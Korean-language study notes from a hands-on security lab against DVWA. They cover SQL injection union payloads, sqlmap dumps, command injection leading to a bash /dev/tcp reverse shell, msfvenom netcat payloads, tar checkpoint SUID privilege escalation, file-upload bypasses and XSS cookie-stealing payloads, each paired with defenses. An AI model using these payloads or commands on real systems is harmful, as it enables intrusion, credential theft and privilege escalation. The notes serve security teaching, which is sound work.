# 2026-09-29 · DVWA 공격 실습 (File Upload·SQLi·Command Injection·XSS·CSRF)

> 원본: [original/Notes_260929_095013_1.pdf](original/Notes_260929_095013_1.pdf) (오전) · [original/Notes_260929_124542_1.pdf](original/Notes_260929_124542_1.pdf) (오후)
>
> ⚠️ DVWA(의도적으로 취약한 웹앱) 실습 기록. 난이도(low/medium/high/impossible)별로 공격과 방어를 함께 정리한다. 실제 시스템 대상 사용 금지.

## 1. sqlmap로 SQLi 자동화 + Command Injection → 리버스 셸
```bash
sudo sqlmap -u "http://192.168.16.54/history.php?user=admin" \
  --cookie="PHPSESSID=..." --dump      # SQL 데이터 덤프
```
- `http://.../control.php?cmdcntr=id` 형태의 **command injection** 확인.
  - `cmdcntr=`에 (nc/mkfifo 리버스 셸을 URL 인코딩해) 삽입.
- 셸 안정화(TTY 업그레이드):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/john && ls -la       # 홈 디렉터리 확인
```

### SUID 바이너리 악용 → 권한 상승
`setuid(0); setgid(0); system("/bin/tar cf archive.tar *")` 형태의 SUID 프로그램이 있으면, tar의 **checkpoint action**으로 임의 명령 실행:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# SUID tar가 * 와일드카드를 인자로 받으며 위 옵션 파일을 옵션으로 해석 → shell.sh 실행
```
- 방어: SUID 최소화, `tar *` 같은 와일드카드 + SUID 조합 금지, 입력 검증.

## 2. msfvenom 리버스 셸 (war)
```bash
sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.16.12 lport=1234 R
# 또는 war 페이로드 → victim에 업로드, Kali에서 nc -lvnp 1234로 수신
```

## 3. DVWA — File Upload
| 난이도 | 우회 방법 | 방어 |
|---|---|---|
| **low** | `rshell.php` 그대로 업로드 → 실행 | 확장자·MIME 미검증이 원인 |
| **medium** | 확장자/Content-Type만 검사 → Burp로 `Content-Type: image/jpeg`로 변조 | 서버측 콘텐츠 검증 필요 |
| **high** | `filename="rshell.php.jpeg"` + `Content-Type: application/x-php` + 파일 앞에 **GIF89a** 매직바이트 추가(이미지로 위장) | 매직바이트·실제 처리까지 검증 |

- 핵심: 클라이언트가 보내는 확장자·Content-Type은 신뢰 불가 → **서버에서 실제 내용 검증 + 실행권한 제거**.

## 4. DVWA — SQL Injection
```sql
-- 입력란: ?id=2&Submit=Submit → ID/First name/Surname가 SQL Query로 노출
1' or 1=1 #                              -- 모든 data 출력
1' union select 1,2 #                     -- 1,2 컬럼 확인(컬럼 수 파악)
1' union select 1,@@version #             -- DB 버전
1' union select table_name,2 from information_schema.tables #   -- 테이블 목록
1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #
1' union select 1,column_name from information_schema.columns where table_name='users' #
1' union select user,password from dvwa.users #   -- 계정·PW 해시 덤프
```
- 획득한 해시는 `hash-identifier`로 유형 확인 후 크래킹.
- **medium**: 입력이 숨겨져 proxy(Burp) 단계로 조작.
- 방어: **Prepared Statement(파라미터 바인딩)**, 최소권한 DB 계정, 오류메시지 숨김.

## 5. DVWA — Command Injection(date 악용) → 리버스 셸
```bash
# 입력 필드(예: ping 대상)에 명령 연결
; bash -c 'bash -i >& /dev/tcp/192.168.16.120/5555 0>&1'
# 서버에서: date; bash -c 'bash -i >& /dev/tcp/192.168.16.120/5555 0>&1'
# Kali: sudo nc -lvnp 5555 → reverse bash shell 연결
```
- 권한 상승 참고: **ejs engine**(addr 127.0.0.1 port 8030) 취약 활용해 재-리버스 셸, **GTFOBins**에서 바이너리별 탈출법 검색.

## 6. DVWA — XSS (Reflected / Stored)
### Reflected
| 난이도 | 우회 | 
|---|---|
| low | `<script>` 구문 그대로 → 입력값 검증 X |
| medium | `<script>` 문자열을 공백으로 치환 → `<scr<script>ipt>alert(document.cookie)</scr</script>ipt>`로 중첩 우회 |
| high | `preg_replace`로 `<script` 필터 → `<img src=x onerror=alert(document.cookie)>` 이벤트 핸들러로 우회 |
| impossible | `htmlspecialchars()`로 특수문자를 HTML 엔티티로 변환 + 입력 검증 → 차단 |

### Stored
- low: `<script>` 구문 저장 → 조회 시 실행.
- medium: `htmlspecialchars`로 특수문자 변환 / `str_replace`로 `<script>` 제거 → 클라이언트에서 name 입력값 제한을 서버측으로, `image src`로 우회 시도.
- high: medium과 유사, impossible: 입력·조회 양쪽에서 `htmlspecialchars` 적용.
- 방어 원칙: **출력 인코딩(컨텍스트별) + 입력 검증 + CSP**.

## 7. DVWA — CSRF
- (상세는 10-01 노트에서 이어짐) 요청에 공격자 의도를 실어 피해자 브라우저가 대신 요청하게 만드는 공격 → **Anti-CSRF 토큰**으로 방어.

## 8. 복습 질문
1. File Upload high 난이도에서 GIF89a·Content-Type·이중 확장자를 함께 쓰는 이유는?
2. SQLi에서 `union select`로 먼저 컬럼 수를 확인하는 이유는?
3. Reflected XSS low→high로 갈수록 우회 기법이 바뀌는 흐름을 설명하면?
4. SUID tar의 checkpoint-action이 권한상승에 악용되는 원리는?
